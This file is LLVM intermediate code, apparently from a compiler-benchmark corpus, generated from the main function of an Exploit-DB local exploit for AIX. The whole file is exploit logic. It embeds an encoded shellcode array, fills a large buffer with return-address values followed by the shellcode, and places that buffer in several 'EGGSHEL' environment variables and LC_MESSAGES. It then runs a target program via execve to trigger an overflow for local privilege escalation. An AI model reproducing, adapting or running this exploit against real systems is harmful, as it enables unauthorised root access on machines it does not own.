; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19214.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19214.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.code = private unnamed_addr constant [23 x i32] [i32 2080899750, i32 -1809712208, i32 -1878981544, i32 1012985881, i32 1617112136, i32 -1872690112, i32 1012977666, i32 1617120268, i32 -1872690108, i32 1012936546, i32 1617127790, i32 -1872690120, i32 1012936563, i32 1617127425, i32 946077695, i32 -1872690116, i32 811664440, i32 2089034360, i32 -2143222720, i32 -2147417020, i32 2080965542, i32 1317012512, i32 0], align 16
@__const.main.VAR = private unnamed_addr constant [30 x i8] c"LC_MESSAGES\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@execv = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"Bad parameters\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"Return address has zero\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"Start...\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"EGGSHEL\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"EGGSHE2\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"EGGSHE3\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"EGGSHE4\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@prog2 = common dso_local global i8* null, align 8
@prog = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [25 x i8] c"Error executing execve \0A\00", align 1
@MAXBUF = common dso_local global i32 0, align 4
@OO = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [23 x i32], align 16
  %9 = alloca [600 x i32], align 16
  %10 = alloca [600 x i32], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [30 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca [4 x i8*], align 16
  %27 = alloca [8 x i8*], align 16
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %30 = bitcast [23 x i32]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %30, i8* align 16 bitcast ([23 x i32]* @__const.main.code to i8*), i64 92, i1 false)
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %31 = bitcast [30 x i8]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %31, i8* align 16 getelementptr inbounds ([30 x i8], [30 x i8]* @__const.main.VAR, i32 0, i32 0), i64 30, i1 false)
  store i32 1, i32* %22, align 4
  store i32 4604, i32* %25, align 4
  store i32 1, i32* %28, align 4
  store i32 0, i32* %29, align 4
  store i32 78, i32* %13, align 4
  store i32 100, i32* %14, align 4
  %32 = load i32, i32* %5, align 4
  %33 = icmp sgt i32 %32, 1
  br i1 %33, label %34, label %39

34:                                               ; preds = %3
  %35 = load i8**, i8*** %6, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %25, align 4
  br label %39

39:                                               ; preds = %34, %3
  store i32* @execv, i32** %20, align 8
  %40 = load i32*, i32** %20, align 8
  %41 = getelementptr inbounds i32, i32* %40, i64 1
  %42 = load i32, i32* %41, align 4
  store i32 %42, i32* %18, align 4
  %43 = load i32*, i32** %20, align 8
  %44 = load i32, i32* %43, align 4
  store i32 %44, i32* %19, align 4
  %45 = load i32, i32* %13, align 4
  %46 = bitcast [23 x i32]* %8 to i8*
  %47 = call i32 @strlen(i8* %46)
  %48 = sdiv i32 %47, 4
  %49 = add i32 %45, %48
  %50 = load i32, i32* %14, align 4
  %51 = icmp ugt i32 %49, %50
  br i1 %51, label %55, label %52

52:                                               ; preds = %39
  %53 = load i32, i32* %14, align 4
  %54 = icmp sgt i32 %53, 600
  br i1 %54, label %55, label %58

55:                                               ; preds = %52, %39
  %56 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %57 = call i32 @exit(i32 1) #4
  unreachable

58:                                               ; preds = %52
  %59 = load i32, i32* %18, align 4
  %60 = and i32 %59, 65535
  %61 = trunc i32 %60 to i16
  %62 = getelementptr inbounds [23 x i32], [23 x i32]* %8, i64 0, i64 0
  %63 = bitcast i32* %62 to i16*
  %64 = getelementptr inbounds i16, i16* %63, i64 7
  %65 = getelementptr inbounds i16, i16* %64, i64 2
  store i16 %61, i16* %65, align 2
  %66 = load i32, i32* %18, align 4
  %67 = lshr i32 %66, 16
  %68 = and i32 %67, 65535
  %69 = trunc i32 %68 to i16
  %70 = getelementptr inbounds [23 x i32], [23 x i32]* %8, i64 0, i64 0
  %71 = bitcast i32* %70 to i16*
  %72 = getelementptr inbounds i16, i16* %71, i64 7
  store i16 %69, i16* %72, align 2
  %73 = load i32, i32* %19, align 4
  %74 = and i32 %73, 65535
  %75 = trunc i32 %74 to i16
  %76 = getelementptr inbounds [23 x i32], [23 x i32]* %8, i64 0, i64 0
  %77 = bitcast i32* %76 to i16*
  %78 = getelementptr inbounds i16, i16* %77, i64 7
  %79 = getelementptr inbounds i16, i16* %78, i64 8
  store i16 %75, i16* %79, align 2
  %80 = load i32, i32* %19, align 4
  %81 = lshr i32 %80, 16
  %82 = and i32 %81, 65535
  %83 = trunc i32 %82 to i16
  %84 = getelementptr inbounds [23 x i32], [23 x i32]* %8, i64 0, i64 0
  %85 = bitcast i32* %84 to i16*
  %86 = getelementptr inbounds i16, i16* %85, i64 7
  %87 = getelementptr inbounds i16, i16* %86, i64 6
  store i16 %83, i16* %87, align 2
  %88 = load i32, i32* %29, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %97

90:                                               ; preds = %58
  %91 = load i32, i32* %13, align 4
  %92 = zext i32 %91 to i64
  %93 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 %92
  %94 = ptrtoint i32* %93 to i32
  %95 = load i32, i32* %25, align 4
  %96 = add i32 %94, %95
  br label %102

97:                                               ; preds = %58
  %98 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 0
  %99 = ptrtoint i32* %98 to i32
  %100 = load i32, i32* %25, align 4
  %101 = add i32 %99, %100
  br label %102

102:                                              ; preds = %97, %90
  %103 = phi i32 [ %96, %90 ], [ %101, %97 ]
  store i32 %103, i32* %24, align 4
  store i32 0, i32* %12, align 4
  br label %104

104:                                              ; preds = %119, %102
  %105 = load i32, i32* %12, align 4
  %106 = load i32, i32* %13, align 4
  %107 = icmp ult i32 %105, %106
  br i1 %107, label %108, label %122

108:                                              ; preds = %104
  %109 = load i32, i32* %29, align 4
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %111, label %113

111:                                              ; preds = %108
  %112 = load i32, i32* %24, align 4
  br label %114

113:                                              ; preds = %108
  br label %114

114:                                              ; preds = %113, %111
  %115 = phi i32 [ %112, %111 ], [ 1342176130, %113 ]
  %116 = load i32, i32* %12, align 4
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 %117
  store i32 %115, i32* %118, align 4
  br label %119

119:                                              ; preds = %114
  %120 = load i32, i32* %12, align 4
  %121 = add i32 %120, 1
  store i32 %121, i32* %12, align 4
  br label %104

122:                                              ; preds = %104
  %123 = load i32, i32* %12, align 4
  %124 = zext i32 %123 to i64
  %125 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 %124
  %126 = bitcast i32* %125 to i8*
  %127 = bitcast [23 x i32]* %8 to i8*
  %128 = call i32 @strcpy(i8* %126, i8* %127)
  %129 = load i32, i32* %12, align 4
  %130 = bitcast [23 x i32]* %8 to i8*
  %131 = call i32 @strlen(i8* %130)
  %132 = sdiv i32 %131, 4
  %133 = add i32 %129, %132
  %134 = sub i32 %133, 1
  store i32 %134, i32* %11, align 4
  %135 = load i32, i32* %24, align 4
  %136 = and i32 %135, 255
  %137 = icmp ne i32 %136, 0
  br i1 %137, label %138, label %147

138:                                              ; preds = %122
  %139 = load i32, i32* %24, align 4
  %140 = icmp ne i32 %139, 0
  br i1 %140, label %141, label %147

141:                                              ; preds = %138
  %142 = load i32, i32* %24, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %147

144:                                              ; preds = %141
  %145 = load i32, i32* %24, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %150, label %147

147:                                              ; preds = %144, %141, %138, %122
  %148 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %149 = call i32 @exit(i32 5) #4
  unreachable

150:                                              ; preds = %144
  br label %151

151:                                              ; preds = %156, %150
  %152 = load i32, i32* %11, align 4
  %153 = add i32 %152, 1
  store i32 %153, i32* %11, align 4
  %154 = load i32, i32* %14, align 4
  %155 = icmp ult i32 %152, %154
  br i1 %155, label %156, label %161

156:                                              ; preds = %151
  %157 = load i32, i32* %24, align 4
  %158 = load i32, i32* %11, align 4
  %159 = zext i32 %158 to i64
  %160 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 %159
  store i32 %157, i32* %160, align 4
  br label %151

161:                                              ; preds = %151
  %162 = load i32, i32* %11, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 %163
  store i32 0, i32* %164, align 4
  store i32 0, i32* %11, align 4
  br label %165

165:                                              ; preds = %175, %161
  %166 = load i32, i32* %11, align 4
  %167 = load i32, i32* %14, align 4
  %168 = sub nsw i32 %167, 1
  %169 = icmp ult i32 %166, %168
  br i1 %169, label %170, label %178

170:                                              ; preds = %165
  %171 = load i32, i32* %24, align 4
  %172 = load i32, i32* %11, align 4
  %173 = zext i32 %172 to i64
  %174 = getelementptr inbounds [600 x i32], [600 x i32]* %10, i64 0, i64 %173
  store i32 %171, i32* %174, align 4
  br label %175

175:                                              ; preds = %170
  %176 = load i32, i32* %11, align 4
  %177 = add i32 %176, 1
  store i32 %177, i32* %11, align 4
  br label %165

178:                                              ; preds = %165
  %179 = load i32, i32* %11, align 4
  %180 = zext i32 %179 to i64
  %181 = getelementptr inbounds [600 x i32], [600 x i32]* %10, i64 0, i64 %180
  store i32 0, i32* %181, align 4
  %182 = load i32, i32* %15, align 4
  %183 = icmp ne i32 %182, 0
  br i1 %183, label %184, label %190

184:                                              ; preds = %178
  %185 = bitcast [600 x i32]* %9 to i8*
  %186 = call i32 @puts(i8* %185)
  %187 = load i32, i32* @stdout, align 4
  %188 = call i32 @fflush(i32 %187)
  %189 = call i32 @exit(i32 0) #4
  unreachable

190:                                              ; preds = %178
  %191 = call i32 @puts(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %192 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 0
  %193 = bitcast i32* %192 to i8*
  %194 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* %193)
  %195 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 0
  store i8* %194, i8** %195, align 16
  %196 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 0
  %197 = bitcast i32* %196 to i8*
  %198 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* %197)
  %199 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 1
  store i8* %198, i8** %199, align 8
  %200 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 0
  %201 = bitcast i32* %200 to i8*
  %202 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* %201)
  %203 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 2
  store i8* %202, i8** %203, align 16
  %204 = getelementptr inbounds [600 x i32], [600 x i32]* %9, i64 0, i64 0
  %205 = bitcast i32* %204 to i8*
  %206 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %205)
  %207 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 3
  store i8* %206, i8** %207, align 8
  %208 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %209 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* %208)
  %210 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 4
  store i8* %209, i8** %210, align 16
  %211 = getelementptr inbounds [30 x i8], [30 x i8]* %17, i64 0, i64 0
  %212 = load i8, i8* %211, align 16
  %213 = sext i8 %212 to i32
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %215, label %226

215:                                              ; preds = %190
  %216 = getelementptr inbounds [30 x i8], [30 x i8]* %17, i64 0, i64 0
  %217 = load i32, i32* %28, align 4
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %219, label %221

219:                                              ; preds = %215
  %220 = bitcast [600 x i32]* %10 to i8*
  br label %223

221:                                              ; preds = %215
  %222 = bitcast [600 x i32]* %9 to i8*
  br label %223

223:                                              ; preds = %221, %219
  %224 = phi i8* [ %220, %219 ], [ %222, %221 ]
  %225 = call i8* @createvar(i8* %216, i8* %224)
  br label %227

226:                                              ; preds = %190
  br label %227

227:                                              ; preds = %226, %223
  %228 = phi i8* [ %225, %223 ], [ null, %226 ]
  %229 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 5
  store i8* %228, i8** %229, align 8
  %230 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 6
  store i8* null, i8** %230, align 16
  %231 = load i8*, i8** @prog2, align 8
  %232 = getelementptr inbounds [4 x i8*], [4 x i8*]* %26, i64 0, i64 0
  store i8* %231, i8** %232, align 16
  %233 = load i32, i32* @prog, align 4
  %234 = getelementptr inbounds [4 x i8*], [4 x i8*]* %26, i64 0, i64 0
  %235 = getelementptr inbounds [8 x i8*], [8 x i8*]* %27, i64 0, i64 0
  %236 = call i32 @execve(i32 %233, i8** %234, i8** %235)
  %237 = call i32 @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0))
  %238 = load i32, i32* %4, align 4
  ret i32 %238
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @puts(i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i8* @createvar(i8*, i8*) #2

declare dso_local i8* @getenv(i8*) #2

declare dso_local i32 @execve(i32, i8**, i8**) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
